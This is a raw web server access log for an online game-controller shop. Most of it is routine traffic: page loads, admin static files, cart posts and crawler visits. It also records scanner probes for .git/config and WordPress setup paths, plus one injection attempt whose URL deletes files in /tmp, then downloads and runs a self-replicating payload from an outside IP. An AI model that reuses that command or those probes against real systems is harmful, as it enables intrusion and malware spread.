192.168.176.1 - - [18/Feb/2025:00:37:20 +0000] "HEAD /static/admin/css/base.css HTTP/1.1" 200 0 "-" "curl/8.9.1"
192.168.192.1 - - [18/Feb/2025:00:38:40 +0000] "GET /static/admin/css/base.css HTTP/1.1" 200 22092 "-" "curl/8.9.1"
192.168.192.1 - - [18/Feb/2025:00:39:01 +0000] "GET /static/admin/css/ HTTP/1.1" 200 1833 "-" "curl/8.9.1"
192.168.192.1 - - [18/Feb/2025:00:40:18 +0000] "HEAD /admin/login/ HTTP/1.1" 400 0 "-" "curl/8.9.1"
192.168.192.1 - - [18/Feb/2025:00:41:42 +0000] "HEAD /admin/login/ HTTP/1.1" 200 0 "-" "curl/8.9.1"
192.168.192.1 - - [18/Feb/2025:00:42:08 +0000] "HEAD /static/admin/css/login.css HTTP/1.1" 200 0 "-" "curl/8.9.1"
192.168.208.1 - - [18/Feb/2025:00:45:14 +0000] "HEAD /admin/login/ HTTP/1.1" 200 0 "-" "curl/8.9.1"
192.168.208.1 - - [18/Feb/2025:00:45:14 +0000] "HEAD /admin/login/ HTTP/1.1" 200 0 "-" "curl/8.9.1"
192.168.208.1 - - [18/Feb/2025:00:45:44 +0000] "HEAD /static/admin/css/login.css HTTP/1.1" 200 0 "-" "curl/8.9.1"
137.184.8.118 - - [18/Feb/2025:00:50:22 +0000] "HEAD /admin/login/ HTTP/1.1" 200 0 "-" "curl/8.9.1"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /admin/login/ HTTP/1.1" 200 4147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/css/dark_mode.css HTTP/1.1" 200 2804 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/css/base.css HTTP/1.1" 200 22092 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2810 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/css/login.css HTTP/1.1" 200 951 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17972 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/js/theme.js HTTP/1.1" 200 1653 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:02 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3063 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:00:51:03 +0000] "GET /favicon.ico HTTP/1.1" 404 3198 "http://137.184.8.118:8080/admin/login/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
104.219.196.2 - - [18/Feb/2025:03:06:29 +0000] "GET /static/css/styles.css?v=1739847989 HTTP/1.1" 200 4307 "https://gamesctrls.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
13.213.8.139 - - [18/Feb/2025:03:09:53 +0000] "GET /.git/config HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
43.163.3.58 - - [18/Feb/2025:03:10:07 +0000] "GET /products/category/retro/ HTTP/1.1" 200 3742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
54.163.13.201 - - [18/Feb/2025:03:10:10 +0000] "GET / HTTP/1.1" 200 9659 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0" "-"
172.69.136.200 - - [18/Feb/2025:03:15:06 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.69.136.190 - - [18/Feb/2025:03:15:22 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.69.136.200 - - [18/Feb/2025:03:15:22 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.219.196.2 - - [18/Feb/2025:03:16:39 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:16:40 +0000] "GET /static/css/styles.css?v=1739848599 HTTP/1.1" 200 4781 "https://gamesctrls.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
172.69.136.191 - - [18/Feb/2025:03:16:46 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.69.136.158 - - [18/Feb/2025:03:16:47 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 3707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.71.95.71 - - [18/Feb/2025:03:17:01 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.71.95.89 - - [18/Feb/2025:03:17:02 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 3707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.219.196.2 - - [18/Feb/2025:03:17:52 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:17:52 +0000] "GET /static/css/styles.css?v=1739848672 HTTP/1.1" 200 5492 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:19:41 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:19:41 +0000] "GET /static/css/styles.css?v=1739848781 HTTP/1.1" 200 5492 "https://gamesctrls.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
193.68.89.10 - - [18/Feb/2025:03:20:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
104.219.196.2 - - [18/Feb/2025:03:21:15 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:21:15 +0000] "GET /static/css/styles.css?v=1739848875 HTTP/1.1" 200 10510 "https://gamesctrls.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:22:47 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:22:47 +0000] "GET /static/css/styles.css?v=1739848967 HTTP/1.1" 200 10799 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
66.249.68.5 - - [18/Feb/2025:03:23:24 +0000] "GET /test-video HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.68.5 - - [18/Feb/2025:03:23:25 +0000] "GET /test-video/ HTTP/1.1" 200 3663 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.68.4 - - [18/Feb/2025:03:23:30 +0000] "GET /static/css/styles.css?v=1739232000 HTTP/1.1" 200 10799 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
104.219.196.2 - - [18/Feb/2025:03:23:35 +0000] "GET /products/controller/dualsense-wireless-controller/ HTTP/1.1" 200 4334 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:23:35 +0000] "GET /static/css/styles.css?v=1739849015 HTTP/1.1" 200 10799 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:23:36 +0000] "POST /cart/ HTTP/1.1" 200 3668 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:23:37 +0000] "GET /static/css/styles.css?v=1739849016 HTTP/1.1" 200 10799 "https://gamesctrls.com/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:23:42 +0000] "POST /cart/ HTTP/1.1" 200 3668 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:23:42 +0000] "GET /static/css/styles.css?v=1739849022 HTTP/1.1" 200 10799 "https://gamesctrls.com/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:24:26 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:24:26 +0000] "GET /static/css/styles.css?v=1739849066 HTTP/1.1" 200 10036 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:26:14 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:26:14 +0000] "GET /static/css/styles.css?v=1739849174 HTTP/1.1" 200 9923 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:26:17 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/test-video/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:26:17 +0000] "GET /static/css/styles.css?v=1739849177 HTTP/1.1" 200 9923 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:27:32 +0000] "GET /products/controller/dualsense-wireless-controller/ HTTP/1.1" 200 4334 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:27:32 +0000] "GET /static/css/styles.css?v=1739849252 HTTP/1.1" 200 9923 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:27:33 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:27:33 +0000] "GET /static/css/styles.css?v=1739849253 HTTP/1.1" 200 9923 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:27:36 +0000] "GET / HTTP/1.1" 200 9906 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:27:36 +0000] "GET /static/css/styles.css?v=1739849256 HTTP/1.1" 200 9923 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:29:14 +0000] "GET / HTTP/1.1" 502 559 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
219.79.44.231 - - [18/Feb/2025:03:30:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.189.31.150/jawsselfrep;chmod+777+/tmp/jawsselfrep;sh+/tmp/jaws.selfrep HTTP/1.1" 400 157 "-" "-" "-"
104.219.196.2 - - [18/Feb/2025:03:31:27 +0000] "GET / HTTP/1.1" 200 9653 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:31:28 +0000] "GET /static/css/styles.css?v=1739849487 HTTP/1.1" 200 10032 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:32:09 +0000] "GET /products/category/arcade-controllers/ HTTP/1.1" 404 3705 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:32:09 +0000] "GET /static/css/styles.css?v=1739849529 HTTP/1.1" 200 10032 "https://gamesctrls.com/products/category/arcade-controllers/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:32:50 +0000] "GET / HTTP/1.1" 200 9653 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:32:50 +0000] "GET /static/css/styles.css?v=1739849570 HTTP/1.1" 200 10062 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:34:37 +0000] "GET / HTTP/1.1" 200 9653 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:34:37 +0000] "GET /static/css/styles.css?v=1739849677 HTTP/1.1" 200 10214 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:36:15 +0000] "GET / HTTP/1.1" 200 9653 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:36:16 +0000] "GET /static/css/styles.css?v=1739849775 HTTP/1.1" 200 10336 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
172.68.10.112 - - [18/Feb/2025:03:36:37 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.10.29 - - [18/Feb/2025:03:36:38 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 3454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.219.196.2 - - [18/Feb/2025:03:36:42 +0000] "POST /cart/add/ HTTP/1.1" 500 3348 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:17 +0000] "GET / HTTP/1.1" 502 559 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:19 +0000] "GET / HTTP/1.1" 200 9653 "https://gamesctrls.com/products/controller/dualsense-wireless-controller/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:19 +0000] "GET /static/css/styles.css?v=1739849839 HTTP/1.1" 200 10336 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
172.68.10.118 - - [18/Feb/2025:03:37:25 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 404 3454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.219.196.2 - - [18/Feb/2025:03:37:25 +0000] "GET /products/controller/xbox-elite-controller-series-2/ HTTP/1.1" 200 4084 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:26 +0000] "GET /static/css/styles.css?v=1739849845 HTTP/1.1" 200 10336 "https://gamesctrls.com/products/controller/xbox-elite-controller-series-2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:28 +0000] "POST /cart/ HTTP/1.1" 200 3415 "https://gamesctrls.com/products/controller/xbox-elite-controller-series-2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:28 +0000] "GET /static/css/styles.css?v=1739849848 HTTP/1.1" 200 10336 "https://gamesctrls.com/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:29 +0000] "GET / HTTP/1.1" 200 9653 "https://gamesctrls.com/cart/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
104.219.196.2 - - [18/Feb/2025:03:37:29 +0000] "GET /static/css/styles.css?v=1739849849 HTTP/1.1" 200 10336 "https://gamesctrls.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:24 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:24 +0000] "" 400 0 "-" "-" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET / HTTP/1.1" 200 9406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET //wp-includes/wlwmanifest.xml HTTP/1.1" 404 3440 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET //xmlrpc.php?rsd HTTP/1.1" 404 3414 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET / HTTP/1.1" 200 9406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 3450 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 3448 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
34.85.234.63 - - [18/Feb/2025:03:38:25 +0000] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 3460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
